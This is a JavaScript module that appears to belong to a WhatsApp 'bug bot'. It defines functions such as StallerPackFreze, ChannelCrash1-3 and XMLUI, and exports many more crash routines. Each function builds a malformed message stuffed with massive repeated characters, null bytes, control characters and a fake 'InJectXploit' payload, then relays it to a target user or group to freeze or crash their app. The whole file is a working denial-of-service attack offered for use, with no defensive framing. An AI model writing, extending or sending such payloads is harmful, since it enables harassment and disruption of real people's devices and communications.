    thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
    thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
    thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
    thumbnailHeight: 252,
    thumbnailWidth: 252,
    imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
    stickerPackSize: "69233",
    stickerPackOrigin: "USER_CREATED"
              },
            },
          },
        }),
        {
          userJid: target,
        }
      );
await client.relayMessage(target, messageContent.message, {
        participant: {
          jid: target,
        },
        messageId: messageContent.key.id,
      });
    }
    
//=============== GROUP BUG  =============== \\
async function StallerPackFreze(client, target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "🩸 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await client.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

//=============== CHANNEL BUG  =============== \\
async function ChannelCrash1(client, target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "completed", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "ꦾ".repeat(10000),
                phone_number: "+5521992999999",
                email: "zoro@phynx.com",
                organization: "ZnX Agency",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u0000".repeat(10000), 
          body: "PHYNX_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await client.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

async function ChannelCrash2(client, target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await client.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function ChannelCrash3(client, target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          { 
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({ 
            status: true,
            criador: "RizxVelz",
            versao: "@latest",
            atualizado: "2025-05-25",
            suporte: "https://wa.me/5521992999999",
            comandosDisponiveis: [`XXX`],
            prefixo: `XXX`, linguagem: "id" })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(999999)
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await client.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

		let InJectXploit = JSON.stringify({
			status: true,
			criador: "TheZoroXploit",
			resultado: {
				type: "md",
				ws: {
					_events: {
						"CB:ib,,dirty": ["Array"]
					},
					_eventsCount: 800000,
					_maxListeners: 0,
					url: "wss://web.whatsapp.com/ws/chat",
					config: {
						version: ["Array"],
						browser: ["Array"],
						waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
						sockCectTimeoutMs: 20000,
						keepAliveIntervalMs: 30000,
						logger: {},
						printQRInTerminal: false,
						emitOwnEvents: true,
						defaultQueryTimeoutMs: 60000,
						customUploadHosts: [],
						retryRequestDelayMs: 250,
						maxMsgRetryCount: 5,
						fireInitQueries: true,
						auth: {
							Object: "authData"
						},
						markOnlineOnsockCect: true,
						syncFullHistory: true,
						linkPreviewImageThumbnailWidth: 192,
						transactionOpts: {
							Object: "transactionOptsData"
						},
						generateHighQualityLinkPreview: false,
						options: {},
						appStateMacVerification: {
							Object: "appStateMacData"
						},
						mobile: true
					}
				}
			}
		});
		
		async function XMLUI(client, target) {
			let msg = await generateWAMessageFromContent(
				target, {
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									hasMediaAttachment: false,
								},
								body: {
									text: "" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000) + "@5".repeat(25000),
								},
								nativeFlowMessage: {
									messageParamsJson: "",
									buttons: [{
											name: "single_select",
											buttonParamsJson: InJectXploit,
										},
										{
											name: "call_permission_request",
											buttonParamsJson: InJectXploit + "\u0003",
								        },
										{
											name: "payment_status",
											buttonParamsJson: InJectXploit + "\u0003",
									    },
										{
											name: "call_permission_request",
											buttonParamsJson: InJectXploit + "\u0003",
										},
										{
											name: "cta_call",
											buttonParamsJson: InJectXploit + "\u0003",
										},
									],
								},
							},
						},
					},
				}, {}
			);

			await client.relayMessage(target, msg.message, {
				messageId: msg.key.id,
				participant: {
					jid: target
				},
			});
		}
		
module.exports = { protocolbug1, protocolbug2, protocolbug3, protocolbug5, protocolbug6, protocolbug7, protocolbug8, bulldozer, invisxaudio, invisxlocation, NewStellarStuck, CrashIOS, invico2, letterCrash, StickerPack6, StallerPackFreze, ChannelCrash1, ChannelCrash2, ChannelCrash3, XMLUI }
